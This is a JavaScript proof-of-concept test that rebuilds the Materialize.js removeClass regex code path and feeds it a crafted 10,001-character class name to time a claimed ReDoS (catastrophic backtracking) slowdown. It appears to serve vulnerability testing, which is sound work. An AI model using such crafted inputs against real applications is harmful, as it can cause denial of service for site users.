// Test specifically for the materialize.js removeClass vulnerability
const testMaterializeVulnerability = () => {
    const element = {
        className: "test-class normal-class vulnerable-class",
        classList: null  // Force regex path
    };
    
    // Malicious input crafted to cause catastrophic backtracking
    // Creates a string with many 'a' characters followed by a different character
    // This causes the regex engine to try many possibilities with backtracking
    const maliciousClassname = 'a'.repeat(10000) + '!';
    
    console.log('Starting removeClass with malicious input...');
    console.time('removeClass-test');
    
    try {
        // Recreate the vulnerable code from materialize.js
        element.className = element.className.toString().replace(
            new RegExp("(^|\\s)" + maliciousClassname.split(" ").join("|") + "(\\s|$)", "gi"),
            " "
        );
    } catch (e) {
        console.log('Error:', e);
    }
    
    console.timeEnd('removeClass-test');
};

// Run the test
console.log('Testing Materialize.js removeClass ReDoS vulnerability...');
testMaterializeVulnerability();